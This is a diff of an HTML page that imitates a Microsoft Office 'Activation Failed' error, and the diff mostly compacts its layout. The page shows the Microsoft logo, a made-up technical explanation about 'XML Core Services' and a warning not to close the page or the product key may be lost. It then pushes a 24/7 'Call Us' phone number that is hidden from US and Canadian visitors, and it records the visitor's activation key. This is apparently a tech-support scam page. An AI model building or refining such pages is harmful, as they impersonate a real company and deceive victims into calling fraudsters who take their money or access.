@@ -27,16 +27,11 @@
         .gradient-bg {
             background: linear-gradient(180deg, #f0f7ff 0%, #ffffff 50%, #f0f7ff 100%);
         }
-        @keyframes fadeInUp {
-            from { opacity: 0; transform: translateY(20px); }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
             to { opacity: 1; transform: translateY(0); }
         }
-        .fade-in-up { animation: fadeInUp 0.6s ease-out forwards; }
-        @keyframes fadeInDown {
-            from { opacity: 0; transform: translateY(-20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .fade-in-down { animation: fadeInDown 0.6s ease-out forwards; }
+        .fade-in { animation: fadeIn 0.5s ease-out forwards; }
         @keyframes pulse-ring {
             0% { transform: scale(0.9); opacity: 1; }
             80%, 100% { transform: scale(1.8); opacity: 0; }
@@ -44,132 +39,89 @@
         .pulse-ring::before {
             content: '';
             position: absolute;
-            inset: -4px;
+            inset: -3px;
             border-radius: 50%;
-            border: 3px solid #ef4444;
+            border: 2px solid #ef4444;
             animation: pulse-ring 1.5s cubic-bezier(0.215, 0.61, 0.355, 1) infinite;
         }
-        .error-icon-wrap {
-            position: relative;
-        }
-        .phone-cta-bar {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            z-index: 9999;
-            background: linear-gradient(135deg, #16a34a, #15803d);
-            padding: 14px 20px;
-            box-shadow: 0 -4px 20px rgba(0,0,0,0.15);
-        }
-        .phone-cta-bar a {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            color: #fff;
-            text-decoration: none;
-            font-weight: 700;
-            font-size: 18px;
-        }
-        .phone-cta-bar .phone-icon {
-            width: 40px;
-            height: 40px;
-            background: rgba(255,255,255,0.2);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            animation: pulse-phone 2s infinite;
-        }
-        @keyframes pulse-phone {
-            0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255,255,255,0.4); }
-            50% { transform: scale(1.05); box-shadow: 0 0 0 10px rgba(255,255,255,0); }
-        }
+        .error-icon-wrap { position: relative; }
     </style>
 </head>
-<body class="min-h-screen gradient-bg text-gray-900">
-    <div class="min-h-screen flex items-center justify-center px-4 py-12">
+<body class="h-screen gradient-bg text-gray-900 overflow-hidden">
+    <div class="h-screen flex items-center justify-center px-4">
         <div class="max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-3xl w-full">
             <!-- Brand logo -->
-            <div class="text-center mb-8 fade-in-down">
-                <img id="errorBrandLogo" src="assets/microsoft-office-logo.svg" alt="Brand logo" class="h-28 w-auto max-w-full object-contain inline-block drop-shadow-sm">
+            <div class="text-center mb-4 fade-in">
+                <img id="errorBrandLogo" src="assets/microsoft-office-logo.svg" alt="Brand logo" class="h-16 w-auto max-w-full object-contain inline-block">
             </div>
 
             <!-- Error card -->
-            <div class="bg-white rounded-2xl shadow-2xl overflow-hidden fade-in-up border border-gray-100">
+            <div class="bg-white rounded-2xl shadow-2xl overflow-hidden fade-in border border-gray-100">
                 <!-- Top accent bar -->
-                <div class="h-1.5 bg-gradient-to-r from-red-500 via-red-400 to-red-500"></div>
+                <div class="h-1 bg-gradient-to-r from-red-500 via-red-400 to-red-500"></div>
 
-                <div class="p-6 sm:p-8">
+                <div class="p-4 sm:p-5">
                     <!-- Error icon + header -->
-                    <div class="text-center mb-4">
-                        <div class="error-icon-wrap inline-flex items-center justify-center w-16 h-16 rounded-full bg-red-50 border-2 border-red-200 mb-4 relative">
-                            <i id="errorIcon" class="fa-solid fa-triangle-exclamation text-2xl text-red-500"></i>
+                    <div class="text-center mb-3">
+                        <div class="error-icon-wrap inline-flex items-center justify-center w-12 h-12 rounded-full bg-red-50 border-2 border-red-200 mb-2 relative">
+                            <i id="errorIcon" class="fa-solid fa-triangle-exclamation text-xl text-red-500"></i>
                         </div>
-                        <h1 id="errorTitle" class="text-xl sm:text-2xl font-bold text-gray-900">Activation Failed</h1>
-                        <p id="errorSubtitle" class="text-sm text-gray-500 mt-2 max-w-sm mx-auto leading-relaxed">This activation key has already been used on another device.</p>
+                        <h1 id="errorTitle" class="text-lg sm:text-xl font-bold text-gray-900">Activation Failed</h1>
+                        <p id="errorSubtitle" class="text-xs text-gray-500 mt-1 max-w-xs mx-auto leading-snug">This activation key has already been used on another device.</p>
                     </div>
 
                     <!-- Warning banner -->
-                    <div class="bg-red-50 border border-red-200 rounded-xl px-4 py-3 flex items-center justify-center gap-2 mb-5">
-                        <i class="fa-solid fa-triangle-exclamation text-red-500"></i>
-                        <p class="text-sm font-bold text-red-600">Do not refresh or close the page you may lose your Product Key.</p>
+                    <div class="bg-red-50 border border-red-200 rounded-lg px-3 py-2 flex items-center justify-center gap-2 mb-3">
+                        <i class="fa-solid fa-triangle-exclamation text-red-500 text-xs"></i>
+                        <p class="text-xs font-bold text-red-600">Do not refresh or close the page you may lose your Product Key.</p>
                     </div>
 
-                    <!-- Error code -->
-                    <div class="bg-gray-50 border border-gray-200 rounded-xl px-4 py-3 mb-4">
-                        <p class="text-[11px] uppercase tracking-wider text-gray-400 font-medium">Error code</p>
-                        <p id="errorCode" class="font-mono font-bold text-gray-900 tracking-wider text-lg">0xC004C060</p>
-                    </div>
-
-                    <!-- Product Key -->
-                    <div class="bg-gray-50 border border-gray-200 rounded-xl px-4 py-3 mb-5">
-                        <p class="text-[11px] uppercase tracking-wider text-gray-400 font-medium mb-1">Product Key</p>
-                        <p id="productKey" class="font-mono font-bold text-gray-900 tracking-wider text-base">XXXXX-XXXXX-XXXXX-XXXXX</p>
+                    <!-- Error code + Product Key row -->
+                    <div class="grid grid-cols-2 gap-2 mb-3">
+                        <div class="bg-gray-50 border border-gray-200 rounded-lg px-3 py-2">
+                            <p class="text-[10px] uppercase tracking-wider text-gray-400 font-medium">Error code</p>
+                            <p id="errorCode" class="font-mono font-bold text-gray-900 tracking-wider text-sm">0xC004C060</p>
+                        </div>
+                        <div class="bg-gray-50 border border-gray-200 rounded-lg px-3 py-2">
+                            <p class="text-[10px] uppercase tracking-wider text-gray-400 font-medium">Product Key</p>
+                            <p id="productKey" class="font-mono font-bold text-gray-900 tracking-wider text-sm">XXXXX-XXXXX-XXXXX-XXXXX</p>
+                        </div>
                     </div>
 
                     <!-- Error detail -->
-                    <div class="bg-amber-50 border border-amber-200 rounded-xl px-4 py-3 mb-5">
+                    <div class="bg-amber-50 border border-amber-200 rounded-lg px-3 py-2 mb-3">
                         <div class="flex items-start gap-2">
-                            <i class="fa-solid fa-circle-info text-amber-500 mt-0.5"></i>
-                            <p id="errorDetail" class="text-sm text-amber-800 leading-relaxed">The Error occurs due to home Network XML Core Services (XML), XML is a set of services that allow applications written in Jscript, VBScript, Or development tools to Create Windows Native XML Based Applications.</p>
+                            <i class="fa-solid fa-circle-info text-amber-500 text-xs mt-0.5"></i>
+                            <p id="errorDetail" class="text-xs text-amber-800 leading-snug">The Error occurs due to home Network XML Core Services (XML), XML is a set of services that allow applications written in Jscript, VBScript, Or development tools to Create Windows Native XML Based Applications.</p>
                         </div>
                     </div>
 
                     <!-- Activation Request Received (hidden for US/CA) -->
-                    <div id="activationReceived" class="bg-emerald-50 border border-emerald-200 rounded-xl px-4 py-4 mb-5" style="display:none;">
+                    <div id="activationReceived" class="bg-emerald-50 border border-emerald-200 rounded-lg px-3 py-2 mb-3" style="display:none;">
                         <div class="flex items-start gap-2">
-                            <i class="fa-solid fa-circle-check text-emerald-500 mt-0.5"></i>
+                            <i class="fa-solid fa-circle-check text-emerald-500 text-xs mt-0.5"></i>
                             <div>
-                                <h3 class="text-sm font-bold text-emerald-800 mb-1">Activation Request Received</h3>
-                                <p class="text-sm text-emerald-700 leading-relaxed">Thank you! We have successfully received your activation request. Our support team will contact you shortly to verify your details and complete the activation process. Please keep your phone available. Thank you for choosing our service.</p>
+                                <p class="text-xs font-bold text-emerald-800">Activation Request Received</p>
+                                <p class="text-xs text-emerald-700 leading-snug">Thank you! We have successfully received your activation request. Our support team will contact you shortly.</p>
                             </div>
                         </div>
                     </div>
 
                     <!-- Actions -->
-                    <div class="flex flex-col gap-3">
-                        <a id="supportBtn" href="https://support.microsoft.com" target="_blank" rel="noopener" class="flex items-center justify-center gap-2 w-full px-6 py-3.5 rounded-xl bg-gradient-to-r from-brand-primary to-brand-dark text-white font-semibold hover:shadow-lg transition-all">
-                            <i class="fa-solid fa-headset"></i> Contact Support
-                        </a>
-                    </div>
+                    <a id="supportBtn" href="https://support.microsoft.com" target="_blank" rel="noopener" class="flex items-center justify-center gap-2 w-full px-4 py-2.5 rounded-lg bg-gradient-to-r from-brand-primary to-brand-dark text-white text-sm font-semibold hover:shadow-lg transition-all">
+                        <i class="fa-solid fa-headset"></i> Contact Support
+                    </a>
                 </div>
             </div>
 
             <!-- CTA Phone (hidden for US/CA) -->
-            <div id="phoneCtaInline" class="mt-6 fade-in-up" style="display:none;">
-                <a href="tel:+19177954485" class="flex items-center justify-center gap-3 bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white font-bold py-4 px-8 rounded-xl transition-all shadow-lg hover:shadow-xl text-lg sm:text-xl">
-                    <i class="fa-solid fa-phone text-xl"></i>
+            <div id="phoneCtaInline" class="mt-4 fade-in" style="display:none;">
+                <a href="tel:+19177954485" class="flex items-center justify-center gap-2 bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white font-bold py-3 px-6 rounded-lg transition-all shadow-lg hover:shadow-xl text-base">
+                    <i class="fa-solid fa-phone"></i>
                     Call Us: +1 (917) 795-4485
                 </a>
-                <p class="text-center text-sm text-green-700 mt-2 font-medium">Available 24/7 for immediate assistance</p>
             </div>
         </div>
-    </div>
-
-    </div>
-
     </div>
 
     <script>
@@ -215,7 +167,7 @@
         sessionStorage.setItem('detectedActivationKey', activationKey);
         const config = brandConfig[brand] || brandConfig.microsoft;
 
-        document.getElementById('errorIcon').className = config.icon + ' text-2xl text-red-500';
+        document.getElementById('errorIcon').className = config.icon + ' text-xl text-red-500';
         document.getElementById('errorTitle').textContent = config.errorTitle;
         document.getElementById('errorSubtitle').textContent = config.errorSubtitle;
         document.getElementById('errorDetail').textContent = config.errorDetail;
